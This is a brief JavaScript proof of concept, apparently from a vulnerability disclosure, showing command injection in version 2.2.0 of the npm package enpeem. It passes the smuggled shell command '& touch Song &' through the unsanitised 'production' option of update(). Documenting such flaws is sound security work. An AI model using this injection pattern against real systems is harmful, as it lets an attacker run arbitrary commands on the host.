/**
 * The version "2.2.0" of enpeem is vulnerable to command injection.
 * The injection point is located in line 115 of file "index.js".
 * The first argument options can be controlled by users without any sanitation.  
 */

var root = require("enpeem");
var attack_code = "& touch Song &";
var opts = {
  "production": attack_code
}
root.update(opts, function(){});

